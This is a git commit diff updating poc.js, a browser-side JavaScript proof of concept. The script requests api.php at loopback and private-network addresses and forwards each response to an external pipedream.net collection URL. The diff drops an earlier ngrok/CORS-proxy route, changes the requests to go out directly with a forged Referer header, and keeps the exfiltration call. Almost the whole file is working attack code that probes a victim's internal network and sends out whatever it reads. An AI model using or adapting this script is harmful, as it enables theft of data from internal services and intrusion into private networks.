000fc0db30ec0cc373c62e8a54de07f35bef3dfb
hashgrem <44004683+hashgrem@users.noreply.github.com>
2024-10-31 17:45:04 +0100

    Update poc.js

--- images/poc.js
+++ images/poc.js
@@ -2,33 +2,23 @@ const localIps = [
     "http://127.0.0.1/api.php",
     "http://localhost/api.php",
     "http://[::1]/api.php",
-    "http://192.168.0.1/api.php",
     "http://192.168.1.1/api.php",
-    "http://10.0.0.1/api.php",
-    "http://10.0.1.1/api.php"
+    "http://10.0.0.1/api.php"
 ];
 
-const proxyUrl = "https://cors-anywhere.herokuapp.com/https://e2cd-92-149-40-183.ngrok-free.app/proxy?url=";
-
 function fetchInternalAPI() {
-    console.log("Function called");
+    console.log('called');
     localIps.forEach(ip => {
-        
-        const targetUrl = proxyUrl + encodeURIComponent(ip);
-        fetch(targetUrl, {
+        fetch(ip, {
             headers: {
-                "ngrok-skip-browser-warning": "true",
-                "User-Agent": "MyApp/0.0.1"
+                "Referer": "http://127.0.0.1:",
             }
         })
         .then(response => response.text())
         .then(data => {
-            console.log(`Resp from ${ip} via proxy:`, data);
-
-            
             fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
         })
-        .catch(error => console.error(`Error fetching ${ip} via proxy:`, error));
+        .catch(error => console.error(`Error fetching ${ip}:`, error));
     });
 }
 
